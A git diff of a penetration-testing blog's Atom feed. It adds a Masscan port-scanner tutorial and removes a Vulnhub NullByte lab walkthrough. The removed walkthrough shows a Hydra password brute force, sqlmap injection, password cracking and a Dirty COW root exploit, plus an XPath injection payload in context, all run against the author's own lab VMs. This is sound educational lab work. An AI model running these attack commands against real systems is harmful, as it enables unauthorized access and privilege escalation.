@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-09T06:24:50-04:00</updated>
+  <updated>2017-06-10T07:15:35-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,338 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Masscan - Kali Linux tools]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools/"/>
+    <updated>2017-06-10T04:17:42-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools</id>
+    <content type="html"><![CDATA[<p>Nmap is our favorite port scanner, but if you want to scan billions of hosts, and still be relatively young when you get the results, there is a solid alternative focused entirely on speed: Masscan &ndash; the Mass IP port scanner</p>
+
+<!-- more -->
+
+
+<p>Homepage: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
+
+<h2>masscan description</h2>
+
+<blockquote><p>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10
+million packets per second.</p>
+
+<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand,
+unicornscan, and ZMap, using asynchronous transmission. The major difference is that it&rsquo;s faster than these other
+scanners. In addition, it&rsquo;s more flexible, allowing arbitrary address ranges and port ranges.</p>
+
+<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local
+TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your
+operating system to firewall the ports that masscan uses.</p>
+
+<p>This program spews out packets very fast. On Windows, or from VMs, it can do 300,000 packets/second. On Linux (no
+virtualization) it&rsquo;ll do 1.6 million packets-per-second. That&rsquo;s fast enough to melt most networks.</p>
+
+<p>Note that it&rsquo;ll only melt your own network. It randomizes the target IP addresses so that it shouldn&rsquo;t overwhelm any
+distant network.</p>
+
+<p>By default, the rate is set to 100 packets/second.</p></blockquote>
+
+<h2>masscan options</h2>
+
+<p><code>
+root@kali:~# masscan                                                         
+usage:
+masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
+ scan some web ports on 10.x.x.x at 10kpps
+masscan --nmap
+ list those options that are compatible with nmap
+masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;
+ save results of scan in binary format to &lt;filename&gt;
+masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;
+ read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;
+</code></p>
+
+<p>More information:</p>
+
+<p><code>
+root@kali:~# masscan --help
+MASSCAN is a fast port scanner. The primary input parameters are the
+IP addresses/ranges you want to scan, and the port numbers. An example
+is the following, which scans the 10.x.x.x network for web servers:
+ masscan 10.0.0.0/8 -p80
+The program auto-detects network interface/adapter settings. If this
+fails, you'll have to set these manually. The following is an
+example of all the parameters that are needed:
+ --adapter-ip 192.168.10.123
+ --adapter-mac 00-11-22-33-44-55
+ --router-mac 66-55-44-33-22-11
+Parameters can be set either via the command-line or config-file. The
+names are the same for both. Thus, the above adapter settings would
+appear as follows in a configuration file:
+ adapter-ip = 192.168.10.123
+ adapter-mac = 00-11-22-33-44-55
+ router-mac = 66-55-44-33-22-11
+All single-dash parameters have a spelled out double-dash equivalent,
+so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
+To use the config file, type:
+ masscan -c &lt;filename&gt;
+To generate a config-file from the current settings, use the --echo
+option. This stops the program from actually running, and just echoes
+the current configuration instead. This is a useful way to generate
+your first config file, or see a list of parameters you didn't know
+about. I suggest you try it now:
+ masscan -p1234 --echo
+</code></p>
+
+<p>Config file:</p>
+
+<blockquote><p>By default, the program will read default configuration from  the  file
+/etc/masscan/masscan.conf. This is useful for system-specific settings,
+such as the &mdash;adapter-xxx options. This is also useful for excluded  IP
+addresses,  so  that  you  can scan the entire Internet, while skipping
+dangerous addresses, like those owned by the DoD, and not make an accidental mistake.</p></blockquote>
+
+<p>Nmap compatible options:</p>
+
+<p>```
+root@kali:~# masscan &mdash;nmap                                                <br/>
+Masscan (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>)
+Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}
+TARGET SPECIFICATION:
+  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)
+  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254
+  -iL <inputfilename>: Input from list of hosts/networks
+  &mdash;exclude &lt;host1[,host2][,host3],&hellip;>: Exclude hosts/networks
+  &mdash;excludefile &lt;exclude_file>: Exclude list from file
+  &mdash;randomize-hosts: Randomize order of hosts (default)
+HOST DISCOVERY:
+  -Pn: Treat all hosts as online (default)
+  -n: Never do DNS resolution (default)
+SCAN TECHNIQUES:
+  -sS: TCP SYN (always on, default)
+SERVICE/VERSION DETECTION:
+  &mdash;banners: get the banners of the listening service if available. The</p>
+
+<pre><code>default timeout for waiting to recieve data is 30 seconds.
+</code></pre>
+
+<p>PORT SPECIFICATION AND SCAN ORDER:
+  -p <port ranges>: Only scan specified ports</p>
+
+<pre><code>Ex: -p22; -p1-65535; -p 111,137,80,139,8080
+</code></pre>
+
+<p>TIMING AND PERFORMANCE:
+  &mdash;max-rate <number>: Send packets no faster than <number> per second
+  &mdash;connection-timeout <number>: time in seconds a TCP connection will</p>
+
+<pre><code>timeout while waiting for banner data from a port.
+</code></pre>
+
+<p>FIREWALL/IDS EVASION AND SPOOFING:
+  -S/&mdash;source-ip &lt;IP_Address>: Spoof source address
+  -e <iface>: Use specified interface
+  -g/&mdash;source-port <portnum>: Use given port number
+  &mdash;ttl <val>: Set IP time-to-live field
+  &mdash;spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
+OUTPUT:
+  &mdash;output-format <format>: Sets output to binary/list/unicornscan/json/grepable/xml
+  &mdash;output-file <file>: Write scan results to file. If &mdash;output-format is</p>
+
+<pre><code> not given default is xml
+</code></pre>
+
+<p>  -oL/-oJ/-oG/-oB/-oX/-oU <file>: Output scan in List/JSON/Grepable/Binary/XML/Unicornscan format,</p>
+
+<pre><code> respectively, to the given filename. Shortcut for
+ --output-format &lt;format&gt; --output-file &lt;file&gt;
+</code></pre>
+
+<p>  -v: Increase verbosity level (use -vv or more for greater effect)
+  -d: Increase debugging level (use -dd or more for greater effect)
+  &mdash;open: Only show open (or possibly open) ports
+  &mdash;packet-trace: Show all packets sent and received
+  &mdash;iflist: Print host interfaces and routes (for debugging)
+  &mdash;append-output: Append to rather than clobber specified output files
+  &mdash;resume <filename>: Resume an aborted scan
+MISC:
+  &mdash;send-eth: Send using raw ethernet frames (default)
+  -V: Print version number
+  -h: Print this help summary page.
+EXAMPLES:
+  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80
+  masscan 23.0.0.0/0 -p80 &mdash;banners -output-format binary &mdash;output-filename internet.scan
+  masscan &mdash;open &mdash;banners &mdash;readscan internet.scan -oG internet_scan.grepable
+SEE (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>) FOR MORE HELP
+```</p>
+
+<p>Manpage: <a href="http://manpages.org/masscan/8">http://manpages.org/masscan/8</a></p>
+
+<h2>masscan usage</h2>
+
+<ul>
+<li>look at the current configuration</li>
+</ul>
+
+
+<p>```
+root@kali:~# masscan &mdash;echo
+rate =     100.00
+randomize-hosts = true
+seed = 9262294816069822464
+shard = 1/1</p>
+
+<h1>ADAPTER SETTINGS</h1>
+
+<p>adapter =
+adapter-ip = 0.0.0.0
+adapter-mac = 00:00:00:00:00:00
+router-mac = 00:00:00:00:00:00</p>
+
+<h1>OUTPUT/REPORTING SETTINGS</h1>
+
+<p>output-format = unknown(0)
+show = open,,
+output-filename =
+rotate = 0
+rotate-dir = .
+rotate-offset = 0
+rotate-filesize = 0
+pcap =</p>
+
+<h1>TARGET SELECTION (IP, PORTS, EXCLUDES)</h1>
+
+<p>retries = 0
+ports =</p>
+
+<p>capture = cert
+nocapture = html
+nocapture = heartbleed</p>
+
+<p>min-packet = 60
+```</p>
+
+<ul>
+<li>check installation</li>
+</ul>
+
+
+<p><code>
+masscan --regress
+regression test: success!
+</code></p>
+
+<ul>
+<li>full port scan on local subnet</li>
+</ul>
+
+
+<p>```
+root@kali:~# masscan -p0-65535 192.168.217.0/24 &mdash;rate 100000</p>
+
+<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:02:34 GMT
+ &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
+Initiating SYN Stealth Scan
+Scanning 256 hosts [65536 ports/host]
+Discovered open port 443/tcp on 192.168.217.131                              <br/>
+Discovered open port 139/tcp on 192.168.217.133                              <br/>
+Discovered open port 139/tcp on 192.168.217.134                              <br/>
+Discovered open port 139/tcp on 192.168.217.131                              <br/>
+Discovered open port 111/tcp on 192.168.217.131                              <br/>
+Discovered open port 23/tcp on 192.168.217.133                               <br/>
+Discovered open port 21/tcp on 192.168.217.133                               <br/>
+Discovered open port 22/tcp on 192.168.217.131                               <br/>
+Discovered open port 22/tcp on 192.168.217.135                               <br/>
+Discovered open port 5432/tcp on 192.168.217.133                             <br/>
+Discovered open port 135/tcp on 192.168.217.134                              <br/>
+Discovered open port 22/tcp on 192.168.217.133                               <br/>
+Discovered open port 25/tcp on 192.168.217.133                               <br/>
+Discovered open port 53/tcp on 192.168.217.133                               <br/>
+Discovered open port 3632/tcp on 192.168.217.133                             <br/>
+Discovered open port 80/tcp on 192.168.217.135                               <br/>
+Discovered open port 80/tcp on 192.168.217.131                               <br/>
+Discovered open port 80/tcp on 192.168.217.133                               <br/>
+Discovered open port 445/tcp on 192.168.217.131                              <br/>
+Discovered open port 445/tcp on 192.168.217.133                              <br/>
+Discovered open port 445/tcp on 192.168.217.134                              <br/>
+Discovered open port 8180/tcp on 192.168.217.133                             <br/>
+Discovered open port 8009/tcp on 192.168.217.133                             <br/>
+Discovered open port 3306/tcp on 192.168.217.133 <br/>
+```</p>
+
+<p>The scan was done in a couple of minutes. You might be wondering, how does this tool scan the entire internet in 3 minutes if it took the same length of time for a puny subnet? Well, there are some limitations. To get the most of its speed, you need the proper adapter and driver. Also notice that I rate-limited it to 100k packets per second, because I didn&rsquo;t want my local network to blow up! If you want to benchmark masscan&rsquo;s performance, look on its homepage, under the Performance testing section.</p>
+
+<ul>
+<li>grab banners of open ports</li>
+</ul>
+
+
+<p>```
+root@kali:~# masscan 192.168.217.0/24 -p22,80,139,445,3306 &mdash;banners &mdash;source-ip 192.168.217.150 &mdash;rate 100000</p>
+
+<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:18:27 GMT
+ &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
+Initiating SYN Stealth Scan
+Scanning 256 hosts [5 ports/host]
+Discovered open port 80/tcp on 192.168.217.133                               <br/>
+Discovered open port 139/tcp on 192.168.217.134                              <br/>
+Discovered open port 22/tcp on 192.168.217.133                               <br/>
+Discovered open port 139/tcp on 192.168.217.133                              <br/>
+Discovered open port 22/tcp on 192.168.217.131                               <br/>
+Discovered open port 80/tcp on 192.168.217.131                               <br/>
+Discovered open port 445/tcp on 192.168.217.131                              <br/>
+Discovered open port 139/tcp on 192.168.217.131                              <br/>
+Discovered open port 22/tcp on 192.168.217.135                               <br/>
+Discovered open port 80/tcp on 192.168.217.135                               <br/>
+Banner on port 22/tcp on 192.168.217.135: [ssh] SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
+Banner on port 22/tcp on 192.168.217.133: [ssh] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
+Banner on port 22/tcp on 192.168.217.131: [ssh] SSH-2.0-OpenSSH_6.6.1        <br/>
+Discovered open port 445/tcp on 192.168.217.134                              <br/>
+Discovered open port 445/tcp on 192.168.217.133                              <br/>
+Discovered open port 3306/tcp on 192.168.217.133                             <br/>
+Banner on port 3306/tcp on 192.168.217.133: [unknown] \x3e\x00\x00\x00\x0a5.0.51a-3ubuntu5\x00\x07\x00\x00\x00M<code>yb]-d3\x00,\xaa\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q^e</code>0o`r\x3crLb\x00
+Banner on port 80/tcp on 192.168.217.131: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:35 GMT\x0d\x0aServer: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips\x0d\x0aLast-Modified: Tue, 02 Aug 2016 13:07:09 GMT\x0d\x0aETag: \x2211-5391664f1e697\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 17\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0a\x0d
+Banner on port 80/tcp on 192.168.217.133: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:36 GMT\x0d\x0aServer: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\x0d\x0aLast-Modified: Wed, 17 Mar 2010 14:08:25 GMT\x0d\x0aETag: \x22107f7-2d-481ffa5ca8840\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 45\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0a\x0d
+```</p>
+
+<p>For this option to work, you have to give masscan its own IP address on the local subnet, something unused by another device. In fact, the recommendation from its homepage is to use it with its separate IP address whenever possible.</p>
+
+<p>And here is how the XML output of the previous scan would look in a spreadsheet:</p>
+
+<p><img class="center" src="/images/tools/masscan-xml.png" title="&lsquo;masscan xml&rsquo; &lsquo;masscan xml output&rsquo;" ></p>
+
+<p>Some other features are:</p>
+
+<ul>
+<li><p>output formats in xml, binary, grepable, list, or JSON</p></li>
+<li><p>resume scans</p></li>
+<li><p>exclude targets</p></li>
+<li><p>runs in Linux, Windows, and Mac OS X</p></li>
+</ul>
+
+
+<h3>More resources</h3>
+
+<ul>
+<li><p><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html">Robert Graham post on masscan</a></p></li>
+<li><p><a href="https://josephpierini.blogspot.com/2016/06/using-masscan-with-top-ports.html">select common ports with Nmap and feed them to Masscan</a></p></li>
+</ul>
+
+
+<p>```
+/ Your own qualities will help prevent \
+\ your advancement in the world.       /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[lbd - Kali Linux tools]]></title>
@@ -2311,406 +2643,6 @@ users/user/name[.='hacker' or 1=1]%00']/parent::*/message
 <p>``` plain
 / You are fighting for survival in your \
 \ own sweet and gentle way.             /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
-    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
-    <updated>2017-04-18T11:00:06-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
-    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s' been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>
-
-<!-- more -->
-
-
-<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>
-
-<p>``` plain
-netdiscover -r 192.168.217.0/24</p>
-
-<p> Currently scanning: Finished!   |   Screen View: Unique Hosts</p>
-
-<p> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740</p>
-
-<hr />
-
-<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>
-
-<hr />
-
-<p> &hellip;          <br/>
- 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor            <br/>
- &hellip;<br/>
-```</p>
-
-<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>
-
-<p>``` plain
-nmap -T4 -p- -sV 192.168.217.135</p>
-
-<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-04-18 11:51 EDT
-Nmap scan report for 192.168.217.135
-Host is up, received arp-response (0.00016s latency).
-Not shown: 65531 closed ports
-Some closed ports may be reported as filtered due to &mdash;defeat-rst-ratelimit
-Reason: 65531 resets
-PORT      STATE SERVICE REASON         VERSION
-80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
-111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
-777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
-53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
-```</p>
-
-<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>
-
-<p><img class="center" src="/images/pentest/nullbyte/web.png" title="&lsquo;nullbyte web&rsquo; &lsquo;nullbyte web page&rsquo;" ></p>
-
-<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>
-
-<p>``` plain
-gobuster -u <a href="http://192.168.217.135/">http://192.168.217.135/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>
-
-<h1>Gobuster v1.2                OJ Reeves (@TheColonial)</h1>
-
-<p>[+] Mode         : dir
-[+] Url/Domain   : <a href="http://192.168.217.135/">http://192.168.217.135/</a>
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>
-
-<h1>[+] Status codes : 200,204,301,302,307</h1>
-
-<p>/uploads (Status: 301)
-/javascript (Status: 301)</p>
-
-<h1>/phpmyadmin (Status: 301)</h1>
-
-<p>```</p>
-
-<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>
-
-<p><code>plain
-exiftool main.gif
-ExifTool Version Number         : 10.40
-File Name                       : main.gif
-Directory                       : .
-File Size                       : 16 kB
-File Modification Date/Time     : 2017:04:18 12:24:59-04:00
-File Access Date/Time           : 2017:04:18 12:24:59-04:00
-File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
-File Permissions                : rw-r--r--
-File Type                       : GIF
-File Type Extension             : gif
-MIME Type                       : image/gif
-GIF Version                     : 89a
-Image Width                     : 235
-Image Height                    : 302
-Has Color Map                   : No
-Color Resolution Depth          : 8
-Bits Per Pixel                  : 1
-Background Color                : 0
-Comment                         : P-): kzMb5nVYJw
-Image Size                      : 235x302
-Megapixels                      : 0.071
-</code></p>
-
-<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>
-
-<p><img class="center" src="/images/pentest/nullbyte/key.png" title="&lsquo;key&rsquo; &lsquo;key form&rsquo;" ></p>
-
-<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>
-
-<p>``` html</p>
-
-<center>
-<form method="post" action="index.php">
-Key:<br>
-<input type="password" name="key">
-</form>
-</center>
-
-
-<p>```</p>
-
-<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>
-
-<p><code>plain
-hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10
-</code>
-This looks ugly, so let me break it into pieces:</p>
-
-<ul>
-<li><p>192.168.217.135 = target name</p></li>
-<li><p>http-form-post = the method used</p></li>
-<li><p>&ldquo;/kzMb5nVYJw/index.php&rdquo; = URL</p></li>
-<li><p>key=^PASS^:invalid key" = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;</p></li>
-<li><p>-l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random</p></li>
-<li><p>-P /usr/share/dict/words = password File</p></li>
-<li><p>-t 10 = number of Threads</p></li>
-<li><p>-w 10 = timeout value</p></li>
-</ul>
-
-
-<p>``` plain
-Hydra v8.3 &copy; 2016 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>
-
-<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-04-18 13:11:54
-[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
-[DATA] attacking service http-post-form on port 80
-[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
-[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
-[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
-[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
-[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
-[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
-1 of 1 target successfully completed, 1 valid password found
-Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2017-04-18 13:45:57
-```</p>
-
-<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>
-
-<p><img class="center" src="/images/pentest/nullbyte/username.png" title="&lsquo;username&rsquo; &lsquo;search username&rsquo;" ></p>
-
-<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>
-
-<p>``` html</p>
-
-<p>Search for usernames: </p>
-
-
-<hr>
-
-
-<p><form action="420search.php" method="get">
-Enter username:<br>
-<input type="text" name="usrtosearch">
-</form>
-```</p>
-
-<p>Navigating to 420search.php revealed 2 usernames:</p>
-
-<p>``` plain
-EMP ID :1
-EMP NAME : ramses</p>
-
-<h2>EMP POSITION :</h2>
-
-<p>EMP ID :2
-EMP NAME : isis</p>
-
-<h2>EMP POSITION : employee</h2>
-
-<p>Fetched data successfully
-```
-I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>
-
-<p><code>plain
-sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
-...
-[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
-...
-Database: seth
-[1 table]
-+----------------------------------------------+
-| users                                        |
-+----------------------------------------------+
-...
-</code></p>
-
-<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>
-
-<p><img class="center" src="/images/pentest/nullbyte/users.png" title="&lsquo;users&rsquo; &lsquo;users csv&rsquo;" ></p>
-
-<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>
-
-<p>``` plain
-ssh -p 777 <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x61;&#x6d;&#x73;&#x65;&#x73;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x32;&#49;&#x37;&#46;&#49;&#x33;&#x35;">&#x72;&#97;&#x6d;&#115;&#101;&#115;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#50;&#x31;&#55;&#x2e;&#x31;&#x33;&#x35;</a>
-<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#114;&#97;&#109;&#115;&#x65;&#115;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#x31;&#51;&#x35;">&#114;&#x61;&#109;&#115;&#101;&#115;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#x31;&#55;&#46;&#49;&#x33;&#x35;</a>&rsquo;s password:</p>
-
-<p>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
-
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
-ramses@NullByte:~$
-```</p>
-
-<p>Time to look around the system!</p>
-
-<p><code>plain
-ls -l /home
-total 12
-drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
-drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
-drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses
-</code></p>
-
-<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>
-
-<p>``` plain
-uname -v</p>
-
-<h1>1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</h1>
-
-<p>```</p>
-
-<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>
-
-<p><code>plain
-./dirtycow
-DirtyCow root privilege escalation
-Backing up /usr/bin/passwd.. to /tmp/bak
-Size of binary: 53112
-Racing, this may take a while..
-thread stopped
-/usr/bin/passwd is overwritten
-Popping root shell.
-Don't forget to restore /tmp/bak
-thread stopped
-root@NullByte:/home/ramses# whoami
-root
-</code></p>
-
-<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>
-
-<p>``` plain
-cat /root/proof.txt
-adf11c7a9e6523e630aaf3b9b7acb51d</p>
-
-<p>It seems that you have pwned the box, congrats.
-Now you done that I wanna talk with you. Write a walk &amp; mail at
-<a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#120;&#108;&#121;&#x30;&#110;&#x40;&#115;&#x69;&#103;&#x61;&#105;&#110;&#x74;&#46;&#111;&#114;&#x67;">&#120;&#x6c;&#121;&#x30;&#x6e;&#x40;&#115;&#105;&#x67;&#x61;&#x69;&#x6e;&#116;&#x2e;&#x6f;&#114;&#x67;</a> attach the walk and proof.txt
-If sigaint.org is down you may mail at <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#110;&#x62;&#x73;&#108;&#x79;&#x30;&#110;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#110;&#x62;&#115;&#x6c;&#121;&#48;&#x6e;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a></p>
-
-<p>USE THIS PGP PUBLIC KEY</p>
-
-<p>&mdash;&mdash;-BEGIN PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
-Version: BCPG C# v1.6.1.0</p>
-
-<p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
-Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
-e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
-Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
-+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
-YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
-Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
-HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
-m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
-XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
-kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
-TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
-Gms=
-=PiAQ
-&mdash;&mdash;-END PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
-```</p>
-
